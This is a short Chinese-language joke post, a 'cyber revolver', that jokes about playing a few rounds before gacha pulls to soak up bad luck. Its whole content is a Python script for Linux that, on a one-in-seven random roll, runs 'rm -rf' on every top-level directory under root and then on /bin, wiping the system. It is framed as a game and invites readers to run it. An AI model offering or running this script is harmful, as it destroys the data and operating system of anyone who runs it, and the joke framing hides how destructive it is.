###### 2077-R8
###### From title
----------------------------------------------------------
# 如题，赛博左轮
#### 抽卡之前多玩几局，吸走煤气
----------------------------------------------------------
###### 适用于Linux
~~~python
from os import system, listdir
from random import randint

if randint(0, 6) == 0:
    path = listdir('/')
    for i in path:
        if i == 'bin':
            continue
        system('rm -rf /' + i)
    system('rm -rf /bin')
~~~
----------------------------------------------------------
